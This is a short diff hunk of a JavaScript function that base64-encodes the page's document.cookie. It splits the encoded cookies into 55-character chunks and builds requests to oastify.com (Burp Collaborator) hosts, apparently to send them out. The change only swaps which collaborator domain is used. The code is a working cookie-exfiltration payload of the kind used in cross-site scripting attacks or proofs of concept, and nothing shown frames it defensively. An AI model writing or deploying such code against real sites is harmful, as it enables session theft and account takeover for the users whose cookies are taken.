@@ -27,7 +27,7 @@ function myFunction() {
 	
 	var param1 = "https://mndpx2c0ki3xk02rjbpxnuxqmhs9g04p.oastify.com/";
 	var param2 = btoa(JSON.stringify(document.cookie)).replaceAll("=", "Z");
-	var domain = '39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/';
+	var domain = 'mndpx2c0ki3xk02rjbpxnuxqmhs9g04p.oastify.com/';
 	var proto  = 'https://';
 	for(let i=0; i<param2.length; i+=55) {
 		var temp = param2.substring(i, i + 55);
